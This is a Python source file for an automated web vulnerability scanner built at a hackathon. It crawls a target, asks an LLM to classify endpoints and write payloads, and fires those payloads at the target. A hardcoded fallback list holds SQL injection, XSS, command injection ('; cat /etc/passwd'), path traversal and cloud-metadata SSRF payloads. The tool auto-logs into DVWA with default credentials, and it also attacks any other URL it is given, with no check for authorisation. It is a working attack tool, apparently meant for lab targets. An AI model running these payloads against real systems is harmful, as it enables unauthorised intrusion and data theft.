"""
Bug Bounty Web Scanner — Hackathon Edition (v2)
Fixed: auto-login, verbose request/response logging, proper session handling
"""

import os
import json
import time
import hashlib
import threading
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, jsonify, send_file
from flask_socketio import SocketIO
import requests as http_req
from bs4 import BeautifulSoup
import urllib3

# Try importing genai for Gemini, but don't require it
try:
    from google import genai
except ImportError:
    genai = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── App ─────────────────────────────────────────────────────────────────────

app = Flask(__name__, static_folder='static')
app.config['SECRET_KEY'] = 'hackathon'
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins='*')

Path('reports').mkdir(exist_ok=True)
if not Path('findings.json').exists():
    Path('findings.json').write_text('[]')

# ─── AI Provider Setup ──────────────────────────────────────────────────────

GROQ_API_KEY = os.environ.get('GROQ_API_KEY', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

gemini_client = None
if GEMINI_API_KEY and genai:
    try:
        gemini_client = genai.Client(api_key=GEMINI_API_KEY)
    except:
        pass

AI_PROVIDER = 'groq' if GROQ_API_KEY else ('gemini' if gemini_client else 'none')
print(f"  🤖 AI Provider: {AI_PROVIDER.upper()}")

scan_active = False
findings_lock = threading.Lock()
ai_call_lock = threading.Lock()   # one AI call at a time

# ─── Helpers ─────────────────────────────────────────────────────────────────

def log(level, text):
    socketio.emit('log', {'level': level, 'text': str(text), 'ts': time.time()})
    print(f"[{level.upper():6s}] {text}")

def fp(method, url, param, vuln):
    return hashlib.sha256(f"{method}:{url}:{param}:{vuln}".lower().encode()).hexdigest()[:8]

def read_findings():
    with findings_lock:
        return json.loads(Path('findings.json').read_text())

def write_finding(finding):
    with findings_lock:
        findings = json.loads(Path('findings.json').read_text())
        if any(f['id'] == finding['id'] for f in findings):
            return False
        findings.append(finding)
        Path('findings.json').write_text(json.dumps(findings, indent=2))
        return True

def ai_call(prompt, temp=0.3):
    """Call AI — one request at a time (rate-limited). Tries Groq first, then Gemini."""
    with ai_call_lock:
        result = _do_ai_call(prompt, temp)
        time.sleep(2)   # slow down: one call at a time with 2s gap
        return result

def _do_ai_call(prompt, temp=0.3):
    if GROQ_API_KEY:
        return _groq_call(prompt, temp)
    if gemini_client:
        return _gemini_call(prompt, temp)
    raise Exception("No AI provider configured (set GROQ_API_KEY or GEMINI_API_KEY)")

def _groq_call(prompt, temp=0.3):
    resp = http_req.post(
        'https://api.groq.com/openai/v1/chat/completions',
        headers={
            'Authorization': f'Bearer {GROQ_API_KEY}',
            'Content-Type': 'application/json'
        },
        json={
            'model': 'llama-3.3-70b-versatile',
            'messages': [{'role': 'user', 'content': prompt}],
            'temperature': temp,
            'max_tokens': 1024
        },
        timeout=30
    )
    if resp.status_code != 200:
        raise Exception(f"Groq API error {resp.status_code}: {resp.text[:200]}")
    return resp.json()['choices'][0]['message']['content'].strip()

def _gemini_call(prompt, temp=0.3):
    resp = gemini_client.models.generate_content(
        model='gemini-2.0-flash',
        contents=prompt,
        config={'temperature': temp}
    )
    return resp.text.strip()

def parse_json(text):
    text = text.strip()
    if '```' in text:
        lines = text.split('\n')
        lines = [l for l in lines if not l.strip().startswith('```')]
        text = '\n'.join(lines)
    s1, s2 = text.find('['), text.find('{')
    if s1 == -1 and s2 == -1:
        raise ValueError("No JSON")
    if s1 != -1 and (s2 == -1 or s1 < s2):
        return json.loads(text[s1:text.rfind(']') + 1])
    return json.loads(text[s2:text.rfind('}') + 1])

SEVERITY = {
    'sqli': 'Critical', 'cmdi': 'Critical', 'lfi': 'High',
    'ssrf': 'High', 'xss': 'Medium', 'idor': 'High',
    'csrf': 'Medium', 'open_redirect': 'Low', 'file_upload': 'High',
}

FALLBACK_PAYLOADS = {
    'sqli': ["' OR '1'='1", "' OR '1'='1' --", "1 OR 1=1", "1 UNION SELECT NULL,NULL--", "' AND '1'='2"],
    'xss': ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', "'-alert(1)-'"],
    'cmdi': ['; ls', '| id', '& whoami', '127.0.0.1; cat /etc/passwd', '`id`'],
    'lfi': ['../../../../etc/passwd', '....//....//....//etc/passwd', '/etc/passwd%00'],
    'ssrf': ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/'],
    'idor': ['1', '2', '0', '999', '-1'],
}

# ─── Auto-Login ──────────────────────────────────────────────────────────────

def dvwa_auto_login(base_url, username='admin', password='password'):
    """
    Auto-login to DVWA. Handles DB setup, CSRF tokens, security level.
    Returns a requests.Session with valid cookies, or None.
    """
    log('info', f'Auto-logging into DVWA at {base_url}...')

    try:
        # Step 0: Ensure DB is set up (use throwaway session)
        log('info', '  Ensuring database is initialized...')
        setup_session = http_req.Session()
        setup_session.verify = False
        setup_url = urljoin(base_url, 'setup.php')
        r_setup = setup_session.get(setup_url, timeout=10)
        soup_setup = BeautifulSoup(r_setup.text, 'html.parser')
        setup_token = soup_setup.find('input', {'name': 'user_token'})
        if setup_token:
            setup_session.post(setup_url, data={
                'create_db': 'Create / Reset Database',
                'user_token': setup_token['value']
            }, timeout=15, allow_redirects=True)
            log('ok', '  Database created/reset')
        else:
            log('info', '  Database already initialized')

        # Step 1: Fresh session for login
        session = http_req.Session()
        session.verify = False

        login_url = urljoin(base_url, 'login.php')
        r = session.get(login_url, timeout=10)
        log('info', f'  Login page: {r.status_code} ({len(r.text)} bytes)')

        soup = BeautifulSoup(r.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        user_token = token_input['value'] if token_input else ''

        # Step 2: POST login
        r2 = session.post(login_url, data={
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }, allow_redirects=False, timeout=10)

        location = r2.headers.get('Location', '')
        if 'login' in location.lower():
            log('error', '  Login FAILED — wrong credentials')
            return None

        # Follow redirect
        session.get(urljoin(base_url, location), timeout=10)
        log('ok', f'  Logged in! → {location}')

        # Step 3: Set security level to low
        session.cookies.set('security', 'medium')
        sec_url = urljoin(base_url, 'security.php')
        r3 = session.get(sec_url, timeout=10)
        soup3 = BeautifulSoup(r3.text, 'html.parser')
        sec_token = soup3.find('input', {'name': 'user_token'})
        if sec_token:
            session.post(sec_url, data={
                'security': 'medium',
                'seclev_submit': 'Submit',
                'user_token': sec_token['value']
            }, timeout=10)
        session.cookies.set('security', 'medium')
        log('ok', '  Security set to MEDIUM')

        # Step 4: Verify access
        test_url = urljoin(base_url, 'vulnerabilities/sqli/?id=1&Submit=Submit')
        r_test = session.get(test_url, timeout=10, allow_redirects=False)
        if r_test.status_code in (301, 302, 303, 307):
            log('error', '  Session invalid — still redirecting to login')
            return None

        log('ok', f'  Session verified! SQLi page: {r_test.status_code} ({len(r_test.text)} bytes)')
        log('info', f'  Cookies: {session.cookies.get_dict()}')

        return session

    except Exception as e:
        log('error', f'  Login error: {e}')
        return None


# ─── Stage 1: Crawl ─────────────────────────────────────────────────────────

# Known DVWA vulnerability paths — always seed these so we never miss them
DVWA_VULN_PATHS = [
    'vulnerabilities/xss_r/',
    'vulnerabilities/xss_s/',
    'vulnerabilities/xss_d/',
    'vulnerabilities/sqli/',
    'vulnerabilities/sqli_blind/',
    'vulnerabilities/cmdi/',
    'vulnerabilities/fi/',
    'vulnerabilities/csrf/',
    'vulnerabilities/upload/',
    'vulnerabilities/brute/',
    'vulnerabilities/idor/',
    'vulnerabilities/open_redirect/',
    'vulnerabilities/weak_id/',
]

def _is_directory_listing(response_text):
    """Detect Apache/Nginx directory listing pages — not real app pages."""
    title_match = BeautifulSoup(response_text, 'html.parser').find('title')
    if title_match and 'index of' in title_match.text.lower():
        return True
    if '<h1>Index of' in response_text or 'Directory listing for' in response_text:
        return True
    return False

def step_crawl(target_url, session):
    log('info', f'═══ STAGE 1: CRAWL ═══')
    log('info', f'Target: {target_url}')

    # Normalise
    base = target_url.rstrip('/')
    parsed_base = urlparse(base)
    base_domain = parsed_base.netloc
    base_path = parsed_base.path.rstrip('/')

    # Detect if target is DVWA by checking the homepage
    is_dvwa = False
    try:
        r_check = session.get(target_url, timeout=8)
        if 'damn vulnerable web application' in r_check.text.lower() or 'dvwa' in r_check.text.lower():
            is_dvwa = True
            log('info', '  🎯 Detected DVWA — seeding known vulnerability paths')
        else:
            log('info', '  🌐 Generic target — crawling organically')
    except:
        pass

    # Start URLs: the target itself, plus index.php for PHP sites
    start_url = f"{parsed_base.scheme}://{base_domain}{base_path}/index.php"
    to_visit_init = [target_url, start_url]

    # Only seed DVWA paths if target is actually DVWA
    if is_dvwa:
        seeded = [f"{parsed_base.scheme}://{base_domain}{base_path}/{p}" for p in DVWA_VULN_PATHS]
        to_visit_init += seeded

    visited = set()
    to_visit = to_visit_init
    endpoints = []
    skip_ext = {'.css','.js','.png','.jpg','.jpeg','.gif','.svg','.ico',
                '.woff','.woff2','.ttf','.eot','.mp4','.pdf','.zip'}
    skip_pages = {'logout.php', 'setup.php', 'login.php', 'security.php', 'phpinfo.php'}

    while to_visit and len(visited) < 80:
        url = to_visit.pop(0).split('#')[0]
        if url in visited or urlparse(url).netloc != base_domain:
            continue
        if any(url.lower().endswith(e) for e in skip_ext):
            continue
        if any(skip in url.lower() for skip in skip_pages):
            continue
        visited.add(url)

        try:
            resp = session.get(url, timeout=8)
            log('info', f'  → GET {url}  [{resp.status_code}] {len(resp.text)} bytes')
        except Exception as e:
            log('warn', f'  ✗ GET {url} FAILED: {e}')
            continue

        # Detect login redirect
        if 'login.php' in resp.url and 'login' not in url.lower():
            log('warn', f'  ⚠ Redirected to login — skipping')
            continue

        # ── Skip Apache/Nginx directory listings — they are NOT app endpoints ──
        if _is_directory_listing(resp.text):
            log('info', f'  ⏭ Directory listing — skipping {url}')
            continue

        soup = BeautifulSoup(resp.text, 'html.parser')

        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = (form.get('method', 'GET')).upper()
            form_url = urljoin(url, action) if action else url
            params = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name:
                    params.append({
                        'name': name,
                        'type': inp.get('type', 'text'),
                        'default_value': inp.get('value', '')
                    })
            if params:
                pnames = {p['name'].lower() for p in params}
                if 'username' in pnames and 'password' in pnames:
                    continue
                endpoints.append({
                    'url': form_url, 'method': method,
                    'source': url, 'params': params, 'type': 'form'
                })
                log('ok', f'    📋 Form: {method} {form_url} → params={[p["name"] for p in params]}')

        for a in soup.find_all('a', href=True):
            link = urljoin(url, a['href'])
            if urlparse(link).netloc != base_domain:
                continue
            parsed = urlparse(link)
            if parsed.query:
                qs = parse_qs(parsed.query)
                params = [{'name': k, 'type': 'query', 'default_value': v[0]} for k, v in qs.items()]
                endpoints.append({
                    'url': link.split('?')[0], 'method': 'GET',
                    'source': url, 'params': params, 'type': 'query'
                })
            clean = link.split('?')[0].split('#')[0]
            if clean not in visited:
                to_visit.append(link)

    # Deduplicate
    seen = set()
    unique = []
    for ep in endpoints:
        key = f"{ep['method']}:{ep['url']}:{','.join(p['name'] for p in ep['params'])}"
        if key not in seen:
            seen.add(key)
            unique.append(ep)

    log('ok', f'Crawl done: {len(visited)} pages visited, {len(unique)} unique endpoints found')
    return unique

# ─── Stage 2: Classify ──────────────────────────────────────────────────────

def step_classify(endpoints):
    log('info', f'═══ STAGE 2: CLASSIFY ═══')

    ep_summary = [{'i': i, 'url': e['url'], 'method': e['method'],
                    'params': [p['name'] for p in e['params']], 'type': e['type']}
                   for i, e in enumerate(endpoints)]

    prompt = f"""You are a web security expert. Classify vulnerability types for these endpoints.

ENDPOINTS:
{json.dumps(ep_summary, indent=2)}

Rules:
- id/uid/user_id → sqli, idor
- name/search/comment/text/message → xss
- ip/host/cmd/command/ping → cmdi
- page/file/path/include → lfi
- url/redirect/next → open_redirect, ssrf
- upload paths → file_upload

Types: sqli, xss, cmdi, lfi, ssrf, idor, csrf, open_redirect, file_upload

Respond ONLY JSON array:
[{{"i": 0, "vuln_types": ["sqli"], "priority": "high"}}]"""

    try:
        raw = ai_call(prompt, temp=0.2)
        cls_list = parse_json(raw)
        for c in cls_list:
            idx = c.get('i', -1)
            if 0 <= idx < len(endpoints):
                endpoints[idx]['vuln_types'] = c.get('vuln_types', [])
                endpoints[idx]['priority'] = c.get('priority', 'medium')
                log('ai', f'  {endpoints[idx]["url"]} → {c.get("vuln_types", [])}')
    except Exception as e:
        log('warn', f'AI classify failed ({e}), using heuristics')
        for ep in endpoints:
            ep['vuln_types'] = _guess(ep)
            ep['priority'] = 'medium'

    order = {'high': 0, 'medium': 1, 'low': 2}
    endpoints.sort(key=lambda e: order.get(e.get('priority', 'medium'), 1))
    return endpoints

def _guess(ep):
    types = set()
    url_lower = ep['url'].lower()
    for p in ep['params']:
        n = p['name'].lower()
        # SQLi / IDOR
        if n in ('id', 'uid', 'user_id', 'item', 'no', 'userid', 'article'):
            types.update(['sqli', 'idor'])
        # XSS — covers DVWA-specific names (txtName, mtxMessage, etc.)
        if n in ('search', 'q', 'name', 'comment', 'text', 'msg', 'message',
                 'txtname', 'mtxmessage', 'txtmessage', 'input', 'query',
                 'keyword', 'term', 'feedback', 'data', 'content', 'value'):
            types.add('xss')
        # CMDi — covers DVWA ping/ip params
        if n in ('ip', 'host', 'cmd', 'command', 'ping', 'target', 'exec'):
            types.add('cmdi')
        # LFI
        if n in ('page', 'file', 'path', 'include', 'doc', 'document', 'filename', 'load'):
            types.add('lfi')
        # SSRF / Open Redirect
        if n in ('url', 'redirect', 'next', 'return', 'goto', 'link', 'dest', 'destination'):
            types.update(['open_redirect', 'ssrf'])
    # URL-based hints
    if 'upload' in url_lower: types.add('file_upload')
    if 'xss' in url_lower:    types.add('xss')
    if 'sqli' in url_lower:   types.add('sqli')
    if 'cmdi' in url_lower:   types.add('cmdi')
    if '/fi/' in url_lower:   types.add('lfi')
    if 'csrf' in url_lower:   types.add('csrf')
    return list(types) if types else ['xss', 'sqli']

# ─── Stage 3: Attack ────────────────────────────────────────────────────────

def step_attack(endpoints, session):
    log('info', f'═══ STAGE 3: ATTACK ═══')

    testable = [e for e in endpoints if e.get('vuln_types')]
    total = sum(len(e['vuln_types']) for e in testable)
    log('info', f'Testing {total} endpoint/vuln combinations')
    count = 0

    for ep in testable:
        # Pick the best param to test
        skip = {'submit', 'login', 'btnsign', 'btnclear', 'btnsubmit',
                'user_token', 'csrf_token', 'change', 'upload', 'max_file_size',
                'step', 'send', 'seclev_submit'}
        test_params = [p for p in ep['params']
                       if p['name'].lower() not in skip
                       and p.get('type', '') not in ('submit', 'hidden', 'file')]
        if not test_params:
            test_params = [p for p in ep['params'] if p['name'].lower() not in skip]
        if not test_params:
            continue

        target_p = test_params[0]

        for vtype in ep['vuln_types']:
            count += 1
            log('attack', f'━━━ [{count}/{total}] {vtype.upper()} → {ep["method"]} {ep["url"]} ({target_p["name"]}) ━━━')

            try:
                payloads = _get_payloads(vtype, ep)

                # Baseline
                bl = _send(session, ep, target_p['name'], target_p.get('default_value', 'test'))
                if bl:
                    log('info', f'  📤 Baseline: {ep["method"]} {bl["url"]}')
                    log('info', f'  📥 Response: [{bl["status_code"]}] {bl["length"]} bytes')
                    log('info', f'  📄 Body preview: {bl["body"][:200]}')

                for payload in payloads:
                    log('attack', f'  🔫 Payload: {payload}')

                    resp = _send(session, ep, target_p['name'], payload)
                    if not resp:
                        log('warn', f'  ✗ No response')
                        continue

                    log('info', f'  📤 Request: {ep["method"]} {resp["url"]}')
                    log('info', f'  📥 Response: [{resp["status_code"]}] {resp["length"]} bytes')
                    log('info', f'  📄 Body: {resp["body"][:300]}')

                    # Check for obvious redirect to login
                    if resp['status_code'] == 302 or 'login.php' in resp.get('url', ''):
                        log('warn', f'  ⚠ Got 302 redirect (session expired?) — skipping')
                        continue

                    vuln, evidence = _analyze(vtype, ep['url'], target_p['name'], payload, bl, resp)

                    if vuln:
                        log('ok', f'  ✅ VULNERABLE! {vtype.upper()} confirmed!')
                        log('ok', f'  Evidence: {evidence}')
                        fid = fp(ep['method'], ep['url'], target_p['name'], vtype)
                        finding = {
                            'id': fid, 'url': ep['url'], 'method': ep['method'],
                            'param': target_p['name'], 'vuln_type': vtype,
                            'payload': payload, 'evidence': evidence,
                            'severity': SEVERITY.get(vtype, 'Medium'),
                            'confirmed': True,
                            'response_code': resp['status_code'],
                            'response_snippet': resp['body'][:500],
                            'timestamp': time.time()
                        }
                        if write_finding(finding):
                            socketio.emit('finding', finding)
                        break
                    else:
                        log('info', f'  ✗ Not vulnerable')

                time.sleep(0.5)
            except Exception as e:
                log('error', f'  Error: {e}')

def _send(session, ep, param_name, value):
    try:
        params = {}
        for p in ep['params']:
            params[p['name']] = value if p['name'] == param_name else p.get('default_value', 'test')

        if ep['method'] == 'GET':
            url = f"{ep['url']}?{urlencode(params)}"
            resp = session.get(url, timeout=10, allow_redirects=False)
        else:
            resp = session.post(ep['url'], data=params, timeout=10, allow_redirects=False)

        # If redirected to login, session is dead
        if resp.status_code in (301, 302, 303, 307):
            location = resp.headers.get('Location', '')
            if 'login' in location.lower():
                return {
                    'status_code': 302,
                    'body': 'REDIRECTED TO LOGIN - SESSION EXPIRED',
                    'url': location,
                    'length': 0
                }
            # Follow other redirects
            resp = session.get(urljoin(ep['url'], location), timeout=10, allow_redirects=False)

        return {
            'status_code': resp.status_code,
            'body': resp.text[:5000],
            'url': resp.url,
            'length': len(resp.text)
        }
    except Exception as e:
        log('warn', f'  Request error: {e}')
        return None

def _get_payloads(vtype, ep):
    pnames = [p['name'] for p in ep['params']]
    prompt = f"""Generate 3-5 penetration test payloads.

VULN: {vtype}
URL: {ep['url']}
METHOD: {ep['method']}
PARAMS: {json.dumps(pnames)}

For sqli: UNION, OR tautology, error-based.
For xss: script, img onerror, svg onload.
For cmdi: semicolon+command, pipe+command.
For lfi: traversal to /etc/passwd.

ONLY JSON array of strings:
["payload1", "payload2"]"""

    try:
        raw = ai_call(prompt, temp=0.4)
        result = parse_json(raw)
        if isinstance(result, list):
            out = [p if isinstance(p, str) else p.get('payload', str(p)) for p in result]
            return out[:5] if out else FALLBACK_PAYLOADS.get(vtype, ['test'])
    except:
        pass
    return FALLBACK_PAYLOADS.get(vtype, ['test'])

def _extract_relevant(html):
    """Strip HTML boilerplate, return just the text content that matters."""
    soup = BeautifulSoup(html, 'html.parser')
    # Remove script/style tags
    for tag in soup(['script', 'style', 'head', 'nav']):
        tag.decompose()
    # Get text
    text = soup.get_text(separator='\n', strip=True)
    # Also look for pre tags (DVWA puts output in pre)
    pres = [p.get_text() for p in BeautifulSoup(html, 'html.parser').find_all('pre')]
    if pres:
        text = '\n'.join(pres) + '\n---FULL TEXT---\n' + text
    return text[:3000]

def _analyze(vtype, url, param, payload, baseline, resp):
    if not resp:
        return False, ""

    body = resp['body']
    bl_body = baseline['body'] if baseline else ''
    bl_len = baseline['length'] if baseline else 0
    atk_len = resp['length']

    # ── LOCAL PATTERN MATCHING (works without AI) ────────────────────────

    if vtype == 'sqli':
        # Check for SQL errors
        sql_errors = ['mysql_', 'You have an error in your SQL syntax',
                      'Warning: mysql', 'Unclosed quotation mark',
                      'SQLSTATE[', 'pg_query', 'ORA-', 'SQL syntax']
        for err in sql_errors:
            if err.lower() in body.lower() and err.lower() not in bl_body.lower():
                return True, f"SQL error message found: {err}"

        # Check for data leakage — multiple rows returned
        # DVWA pattern: multiple <pre> tags with user data
        atk_pres = len(BeautifulSoup(body, 'html.parser').find_all('pre'))
        bl_pres = len(BeautifulSoup(bl_body, 'html.parser').find_all('pre'))
        if atk_pres > bl_pres and atk_pres >= 2:
            return True, f"Data leaked: {atk_pres} data rows vs {bl_pres} baseline (multiple DB records returned)"

        # Check for significantly different response (UNION, tautology)
        if atk_len > bl_len * 1.3 and atk_len - bl_len > 100:
            # Make sure it's actual data, not just error messages
            soup = BeautifulSoup(body, 'html.parser')
            pres = soup.find_all('pre')
            if pres:
                return True, f"Response significantly larger ({atk_len} vs {bl_len} bytes) with data output"

    elif vtype == 'xss':
        # Check if payload appears UNESCAPED in response
        xss_markers = [
            '<script>alert(1)</script>',
            '<script>alert(1)</script>',  
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svg onload=alert(1)>',
            'onerror=alert(1)',
        ]
        payload_lower = payload.lower().replace('">', '').strip()
        # Direct check
        if payload in body:
            return True, f"XSS payload reflected unescaped in response: {payload[:60]}"
        # Check common markers
        for marker in xss_markers:
            if marker in body and marker not in bl_body:
                return True, f"XSS marker found in response: {marker}"

    elif vtype == 'cmdi':
        # Check for command output
        cmd_evidence = [
            ('uid=', 'Unix uid output found'),
            ('root:x:0:0:', '/etc/passwd content leaked'),
            ('root:x:0:0', 'System file contents revealed'),
            ('daemon:', 'System user list exposed'),
            ('www-data', 'Web server user info exposed'),
            ('bin/bash', 'Shell path revealed'),
            ('total ', 'Directory listing output (ls command)'),
        ]
        for marker, desc in cmd_evidence:
            if marker in body and marker not in bl_body:
                return True, desc

        # Check for significant extra content that looks like command output
        if atk_len > bl_len + 50:
            extra = body[len(bl_body):] if len(body) > len(bl_body) else body
            if any(m in extra for m, _ in cmd_evidence):
                return True, "Command execution output detected in response"

    elif vtype == 'lfi':
        # Check for file contents
        lfi_markers = [
            ('root:x:0:0:', '/etc/passwd file contents exposed'),
            ('[boot loader]', 'Windows boot.ini exposed'),
            ('root:*:0:0:', '/etc/passwd (BSD) exposed'),
            ('[extensions]', 'PHP ini file exposed'),
        ]
        for marker, desc in lfi_markers:
            if marker in body and marker not in bl_body:
                return True, desc

    elif vtype == 'idor':
        # Check if different data returned for different IDs
        if atk_len != bl_len and abs(atk_len - bl_len) > 20:
            bl_text = _extract_relevant(bl_body)
            atk_text = _extract_relevant(body)
            if bl_text != atk_text:
                return True, f"Different data returned for different ID (response differs by {abs(atk_len - bl_len)} bytes)"

    # ── Try Gemini as enhancement (if available) ─────────────────────────
    try:
        bl_text = _extract_relevant(bl_body)[:1500]
        atk_text = _extract_relevant(body)[:2000]

        prompt = f"""Determine if this web vulnerability was exploited.

VULN: {vtype} | URL: {url} | PARAM: {param} | PAYLOAD: {payload}

BASELINE: status={baseline['status_code'] if baseline else 'N/A'} len={bl_len}
{bl_text}

ATTACK: status={resp['status_code']} len={atk_len}
{atk_text}

SQLi: extra rows, different user data. XSS: payload unescaped in HTML.
CMDi: system command output. LFI: file contents like /etc/passwd.

ONLY JSON: {{"vulnerable": true/false, "evidence": "proof"}}"""

        raw = ai_call(prompt, temp=0.1)
        result = parse_json(raw)
        if isinstance(result, dict):
            return result.get('vulnerable', False), result.get('evidence', '')
    except:
        pass

    return False, ""

# ─── Stage 4: Reports ───────────────────────────────────────────────────────

def step_reports():
    log('info', f'═══ STAGE 4: REPORTS ═══')
    findings = [f for f in read_findings() if f.get('confirmed')]

    for f in findings:
        rpath = Path('reports') / f"{f['id']}.md"
        if rpath.exists():
            continue
        prompt = f"""Write a professional bug bounty report.

VULN: {f['vuln_type']} | SEVERITY: {f['severity']}
URL: {f['url']} | METHOD: {f['method']} | PARAM: {f['param']}
PAYLOAD: {f['payload']}
EVIDENCE: {f['evidence']}
RESPONSE CODE: {f.get('response_code', '')}
RESPONSE: {f.get('response_snippet', '')[:800]}

Format:
# {f['severity']} — [Title]
## Summary
## Affected Endpoint
## Steps to Reproduce (with curl command)
## Impact
## Remediation"""

        try:
            report = ai_call(prompt, temp=0.3)
            rpath.write_text(report)
            log('ok', f'  Report: {rpath.name}')
        except Exception as e:
            rpath.write_text(f"# {f['severity']} — {f['vuln_type'].upper()} in {f['param']}\n\n"
                           f"**URL:** {f['url']}\n**Payload:** `{f['payload']}`\n**Evidence:** {f['evidence']}\n")
            log('warn', f'  Template saved ({e})')

# ─── Pipeline ────────────────────────────────────────────────────────────────

def run_pipeline(target_url, cookies_str, auto_login=True):
    global scan_active
    start = time.time()

    try:
        # ── Detect target type & setup session ──
        if auto_login:
            # Check if target is DVWA before attempting DVWA-specific login
            try:
                test_session = http_req.Session()
                test_session.verify = False
                r_check = test_session.get(target_url, timeout=8, allow_redirects=True)
                is_dvwa = 'damn vulnerable web application' in r_check.text.lower() or 'dvwa' in r_check.text.lower()
            except:
                is_dvwa = False

            if is_dvwa:
                log('info', '🎯 DVWA detected — attempting auto-login')
                session = dvwa_auto_login(target_url)
                if not session:
                    log('error', 'Auto-login failed. Try providing cookies manually.')
                    return
            else:
                log('info', '🌐 Generic target — no auto-login needed')
                session = http_req.Session()
                session.verify = False
        else:
            session = http_req.Session()
            session.verify = False
            if cookies_str:
                session.headers['Cookie'] = cookies_str
            # Verify session
            r = session.get(target_url, timeout=10)
            if 'login.php' in r.url:
                log('error', 'Cookie session invalid — redirected to login.')
                return

        # ── Stage 1: Crawl ──
        socketio.emit('stage', {'stage': 'crawl', 'status': 'active'})
        endpoints = step_crawl(target_url, session)
        socketio.emit('stage', {'stage': 'crawl', 'status': 'done'})

        if not endpoints:
            log('warn', 'No endpoints found.')
            return

        # ── Stage 2: Classify ──
        socketio.emit('stage', {'stage': 'classify', 'status': 'active'})
        classified = step_classify(endpoints)
        socketio.emit('stage', {'stage': 'classify', 'status': 'done'})

        # ── Stage 3: Attack ──
        socketio.emit('stage', {'stage': 'attack', 'status': 'active'})
        step_attack(classified, session)
        socketio.emit('stage', {'stage': 'attack', 'status': 'done'})

        # ── Stage 4: Reports ──
        socketio.emit('stage', {'stage': 'report', 'status': 'active'})
        step_reports()
        socketio.emit('stage', {'stage': 'report', 'status': 'done'})

        # ── Done ──
        dur = round(time.time() - start, 1)
        confirmed = [f for f in read_findings() if f.get('confirmed')]
        socketio.emit('scan_complete', {
            'duration': dur, 'total': len(read_findings()), 'confirmed': len(confirmed)
        })
        log('ok', f'═══ SCAN COMPLETE: {len(confirmed)} vulns in {dur}s ═══')

    except Exception as e:
        log('error', f'Pipeline error: {e}')
    finally:
        scan_active = False
        socketio.emit('stage', {'stage': 'complete', 'status': 'done'})

# ─── Routes ──────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return send_file('static/index.html')

@app.route('/scan', methods=['POST'])
def start_scan():
    global scan_active
    if scan_active:
        return jsonify({'error': 'Scan already running'}), 409

    data = request.get_json()
    url = data.get('target_url', '').strip()
    cookies = data.get('cookies', '').strip()

    if not url:
        return jsonify({'error': 'URL required'}), 400
    if not url.startswith(('http://', 'https://')):
        return jsonify({'error': 'URL must start with http:// or https://'}), 400

    Path('findings.json').write_text('[]')

    # If cookies provided, use them. Otherwise auto-login.
    auto = not bool(cookies)

    scan_active = True
    threading.Thread(target=run_pipeline, args=(url, cookies, auto), daemon=True).start()
    return jsonify({'status': 'started'})

@app.route('/findings')
def get_findings():
    return jsonify(read_findings())

@app.route('/reports/<path:filename>')
def get_report(filename):
    p = Path('reports') / Path(filename).name
    if not p.exists(): return 'Not found', 404
    return p.read_text(), 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/status')
def status():
    return jsonify({'active': scan_active})

@socketio.on('connect')
def on_connect():
    log('info', 'Dashboard connected')

if __name__ == '__main__':
    port = int(os.environ.get('FLASK_PORT', '7331'))
    print(f"\n  🎯 Bug Bounty Scanner → http://127.0.0.1:{port}\n")
    socketio.run(app, host='127.0.0.1', port=port, debug=False, allow_unsafe_werkzeug=True)
